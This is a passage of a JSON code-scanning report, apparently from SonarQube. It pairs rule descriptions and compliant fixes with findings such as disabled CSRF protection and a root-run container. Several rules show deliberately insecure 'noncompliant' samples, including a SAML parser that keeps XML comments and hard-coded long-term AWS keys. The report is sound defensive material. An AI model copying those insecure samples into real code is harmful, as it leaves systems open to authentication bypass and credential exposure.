org.opensaml.xml.parse.ParserPool;\n\npublic ParserPool parserPool() {\n  BasicParserPool basicParserPool = new BasicParserPool();\n  basicParserPool.setIgnoreComments(false); // Noncompliant\n  return basicParserPool;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport org.opensaml.xml.parse.StaticBasicParserPool;\nimport org.opensaml.xml.parse.ParserPool;\n\npublic ParserPool parserPool() {\n  return new StaticBasicParserPool();\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport org.opensaml.xml.parse.BasicParserPool;\nimport org.opensaml.xml.parse.ParserPool;\n\npublic ParserPool parserPool() {\n  return new BasicParserPool();\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> OpenSAML API - <a href=\"https://javadoc.io/doc/org.opensaml/xmltooling/latest/org/opensaml/xml/parse/BasicParserPool.html\">Class\n  BasicParserPool</a> </li>\n  <li> OpenSAML API - <a href=\"https://javadoc.io/doc/org.opensaml/xmltooling/latest/org/opensaml/xml/parse/StaticBasicParserPool.html\">Class\n  StaticBasicParserPool</a> </li>\n  <li> W3C Recommendation - <a href=\"https://www.w3.org/TR/xml-c14n11/\">Canonical XML Version 1.1</a> </li>\n  <li> W3C Recommendation - <a href=\"https://www.w3.org/TR/xmldsig-core1/\">XML Signature Syntax and Processing Version 1.1</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Cisco Duo - <a href=\"https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations\">Duo Finds SAML Vulnerabilities\n  Affecting Multiple Implementations</a> </li>\n  <li> Spring blog - <a href=\"https://spring.io/blog/2018/03/01/spring-security-saml-and-this-week-s-saml-vulnerability\">Spring Security SAML and this\n  week’s SAML Vulnerability</a> </li>\n  <li> Spring Security SAML - <a href=\"https://github.com/spring-projects/spring-security-saml/issues/228\">Issue #228 Multiple SAML libraries may\n  allow authentication bypass via incorrect XML canonicalization and DOM traversal</a> </li>\n  <li> CVE - <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11427\">CVE-2017-11427</a> </li>\n  <li> CVE - <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11428\">CVE-2017-11428</a> </li>\n  <li> CVE - <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11429\">CVE-2017-11429</a> </li>\n  <li> CVE - <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11430\">CVE-2017-11430</a> </li>\n  <li> CVE - <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0489\">CVE-2018-0489</a> </li>\n  <li> CVE - <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7340\">CVE-2018-7340</a> </li>\n</ul>\n<h2>Standards</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n</ul>",
        "severity": "MAJOR"
      },
      "OWASP:UsingComponentWithKnownVulnerability": {
        "name": "Using Components with Known Vulnerabilities",
        "htmlDesc": "<p>Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts.</p><h3>References:</h3><ul><li>OWASP Top 10 2013-A9: <a href=\"https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities\">Using Components with Known Vulnerabilities</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/937.html\">Common Weakness Enumeration CWE-937</a></li><p>This issue was generated by <a href=\"https://www.owasp.org/index.php/OWASP_Dependency_Check\">Dependency-Check</a>",
        "severity": "MAJOR"
      },
      "OWASP:UsingComponentWithKnownVulnerabilitySecurityHotspot": {
        "name": "Using Components with Known Vulnerabilities",
        "htmlDesc": "<p>Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts.</p><h3>References:</h3><ul><li>OWASP Top 10 2013-A9: <a href=\"https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities\">Using Components with Known Vulnerabilities</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/937.html\">Common Weakness Enumeration CWE-937</a></li><p>This issue was generated by <a href=\"https://www.owasp.org/index.php/OWASP_Dependency_Check\">Dependency-Check</a>",
        "severity": "MAJOR"
      },
      "abap:S1492": {
        "name": "Having SQL \"SELECT\" statements without \"WHERE\" conditions is security-sensitive",
        "htmlDesc": "<p>Although the <code>WHERE</code> condition is optional in a <code>SELECT</code> statement, for performance and security reasons, a\n<code>WHERE</code> clause should always be specified to prevent reading the whole table.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The whole table is not required. </li>\n  <li> The table contains sensitive information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Add a \"WHERE\" condition to \"SELECT\" statements.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nSELECT * FROM db_persons INTO us_persons.\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nSELECT * FROM db_persons INTO us_persons WHERE country IS 'US'.\n</pre>\n<h2>Exceptions</h2>\n<p><code>SELECT SINGLE</code> and <code>UP TO 1 ROWS</code> result in only one record being read, so such <code>SELECT</code>s are ignored by this\nrule.</p>\n<pre>\nSELECT SINGLE * FROM db_persons INTO us_persons.\n\nSELECT * FROM db_persons UP TO 1 ROWS INTO us_persons.\n</pre>",
        "severity": "MAJOR"
      },
      "cloudformation:S6364": {
        "name": "Defining a short backup retention duration is security-sensitive",
        "htmlDesc": "<p>Reducing the backup retention duration can reduce an organization’s ability to re-establish service in case of a security incident.</p>\n<p>Data backups allow to overcome corruption or unavailability of data by recovering as efficiently as possible from a security incident.</p>\n<p>Backup retention duration, coverage, and backup locations are essential criteria regarding functional continuity.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This component is essential for the information system infrastructure. </li>\n  <li> This component is essential for mission-critical functions. </li>\n  <li> Compliance policies require this component to be backed up for a specific amount of time. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Increase the backup retention period to an amount of time sufficient enough to be able to restore service in case of an incident.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://aws.amazon.com/rds/\">Amazon Relational Database Service</a> clusters and instances:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  relationaldatabase:\n    Type: 'AWS::RDS::DBInstance'\n    Properties:\n      DBName: NonCompliantDatabase\n      BackupRetentionPeriod: 2 # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://aws.amazon.com/rds/\">Amazon Relational Database Service</a> clusters and instances:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  relationaldatabase:\n    Type: 'AWS::RDS::DBInstance'\n    Properties:\n      DBName: CompliantDatabase\n      BackupRetentionPeriod: 5\n</pre>",
        "severity": "MAJOR"
      },
      "terraform:S6364": {
        "name": "Defining a short backup retention duration is security-sensitive",
        "htmlDesc": "<p>Reducing the backup retention duration can reduce an organization’s ability to re-establish service in case of a security incident.</p>\n<p>Data backups allow to overcome corruption or unavailability of data by recovering as efficiently as possible from a security incident.</p>\n<p>Backup retention duration, coverage, and backup locations are essential criteria regarding functional continuity.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This component is essential for the information system infrastructure. </li>\n  <li> This component is essential for mission-critical functions. </li>\n  <li> Compliance policies require this component to be backed up for a specific amount of time. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Increase the backup retention period to an amount of time sufficient enough to be able to restore service in case of an incident.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://aws.amazon.com/rds/\">Amazon Relational Database Service</a> clusters and instances:</p>\n<pre>\nresource \"aws_db_instance\" \"example\" {\n  backup_retention_period = 2 # Sensitive\n}\n</pre>\n<p>For <a href=\"https://docs.microsoft.com/en-us/azure/cosmos-db/introduction\">Azure Cosmos DB</a> accounts:</p>\n<pre>\nresource \"azurerm_cosmosdb_account\" \"example\" {\n  backup {\n    type = \"Periodic\"\n    retention_in_hours = 8 # Sensitive\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://aws.amazon.com/rds/\">Amazon Relational Database Service</a> clusters and instances:</p>\n<pre>\nresource \"aws_db_instance\" \"example\" {\n  backup_retention_period = 5\n}\n</pre>\n<p>For <a href=\"https://docs.microsoft.com/en-us/azure/cosmos-db/introduction\">Azure Cosmos DB</a> accounts:</p>\n<pre>\nresource \"azurerm_cosmosdb_account\" \"example\" {\n  backup {\n    type = \"Periodic\"\n    retention_in_hours = 300\n  }\n}\n</pre>",
        "severity": "MAJOR"
      },
      "java:S6263": {
        "name": "Using long-term access keys is security-sensitive",
        "htmlDesc": "<p>In AWS, long-term access keys will be valid until you manually revoke them. This makes them highly sensitive as any exposure can have serious\nconsequences and should be used with care.</p>\n<p>This rule will trigger when encountering an instantiation of <code>com.amazonaws.auth.BasicAWSCredentials</code>.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The access key is used directly in an application or AWS CLI script running on an Amazon EC2 instance. </li>\n  <li> Cross-account access is needed. </li>\n  <li> The access keys need to be embedded within a mobile application. </li>\n  <li> Existing identity providers (SAML 2.0, on-premises identity store) already exists. </li>\n</ul>\n<p>For more information, see <a href=\"https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html#use-roles\">Use IAM roles\ninstead of long-term access keys</a>.</p>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Consider using IAM roles or other features of the AWS Security Token Service that provide temporary credentials, limiting the risks.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport com.amazonaws.auth.AWSCredentials;\nimport com.amazonaws.auth.BasicAWSCredentials;\n// ...\n\nAWSCredentials awsCredentials = new BasicAWSCredentials(accessKeyId, secretAccessKey);\n</pre>\n<h2>Compliant Solution</h2>\n<p>Example for AWS STS (see <a href=\"https://docs.aws.amazon.com/sdk-for-java/v1/developer-guide/prog-services-sts.html\">Getting Temporary Credentials\nwith AWS STS</a>).</p>\n<pre>\nBasicSessionCredentials sessionCredentials = new BasicSessionCredentials(\n   session_creds.getAccessKeyId(),\n   session_creds.getSecretAccessKey(),\n   session_creds.getSessionToken());\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html\">Best practices for managing AWS access keys</a>\n  </li>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html\">Managing access keys for IAM users</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "mule3-repository:configuration.3": {
        "name": "AutoDiscovery should be used to register the app in API manager",
        "htmlDesc": "AutoDiscovery should be used to register the app in API manager",
        "severity": "MAJOR"
      },
      "mule3-repository:flows.5": {
        "name": "Encryption key should not be logged",
        "htmlDesc": "Encryption key should not be logged",
        "severity": "MAJOR"
      },
      "mule3-repository:configuration.10": {
        "name": "HTTP Listener should use HTTPS protocol",
        "htmlDesc": "HTTP Listener should use HTTPS protocol",
        "severity": "MAJOR"
      },
      "mule4-repository:configuration.19": {
        "name": "Domain - HTTPS Listener should have a TLS Configuration",
        "htmlDesc": "<b>Domain</b> - HTTPS Listener should have a TLS Configuration",
        "severity": "MAJOR"
      },
      "mule4-repository:flows.6": {
        "name": "Encryption key should not be logged",
        "htmlDesc": "Encryption key should not be logged",
        "severity": "MAJOR"
      },
      "mule4-repository:configuration.7": {
        "name": "HTTP Listener should use HTTPS protocol",
        "htmlDesc": "HTTP Listener should use HTTPS protocol",
        "severity": "MAJOR"
      },
      "mule4-repository:configuration.3": {
        "name": "AutoDiscovery should be used to register the app in API manager",
        "htmlDesc": "AutoDiscovery should be used to register the app in API manager",
        "severity": "MAJOR"
      },
      "mule4-repository:configuration.18": {
        "name": "Domain - Trust Store Configuration should not have the insecure attribute",
        "htmlDesc": "<b>Domain</b> - Trust Store Configuration should not have the insecure attribute",
        "severity": "CRITICAL"
      },
      "mule4-repository:configuration.16": {
        "name": "Domain - Trust Store Configuration should use a configurable path",
        "htmlDesc": "<b>Domain</b> - Trust Store Configuration should use a configurable path",
        "severity": "MINOR"
      },
      "mule4-repository:configuration.17": {
        "name": "Domain - Key Store Configuration should use a configurable path",
        "htmlDesc": "<b>Domain</b> - Key Store Configuration should use a configurable path",
        "severity": "MINOR"
      },
      "mule4-repository:configuration.13": {
        "name": "Domain - Mule Secure Properties should use AES-CBC algorithm",
        "htmlDesc": "<b>Domain</b> - Mule Secure Properties should use AES-CBC algorithm",
        "severity": "MAJOR"
      }
    },
    "issues": [
      {
        "rule": "python:S3752",
        "severity": "HIGH",
        "status": "TO_REVIEW",
        "component": "app.py",
        "line": 90,
        "description": "Allowing both safe and unsafe HTTP methods is security-sensitive",
        "message": "Make sure allowing safe and unsafe HTTP methods is safe here.",
        "key": "fe0b8add-a857-4136-9a8a-0bdc39ee3204"
      },
      {
        "rule": "python:S4502",
        "severity": "HIGH",
        "status": "TO_REVIEW",
        "component": "app.py",
        "line": 27,
        "description": "Disabling CSRF protections is security-sensitive",
        "message": "Make sure disabling CSRF protection is safe here.",
        "key": "d9e751f5-31da-42c0-842e-53f659cec80b"
      },
      {
        "rule": "docker:S6471",
        "severity": "MEDIUM",
        "status": "TO_REVIEW",
        "component": "Dockerfile",
        "line": 1,
        "description": "Running containers as a privileged user is security-sensitive",
        "message": "The python image runs with root as the default user. Make sure it is safe here.",
        "key": "dc781f67-3704-47a0-9df1-565d19a2bf23"
      }
    ],
    "hotspotKeys": [
      "fe0b8add-a857-4136-9a8a-0bdc39ee3204",
      "d9e751f5-31da-42c0-842e-53f659cec80b",
      "dc781f67-3704-47a0-9df1-565d19a2bf23"
    ],
    "deltaAnalysis": "No",
    "qualityGateStatus": false,
    "summary": {
      "high": 2,
      "medium": 1,
      "low": 0
    }
  }
  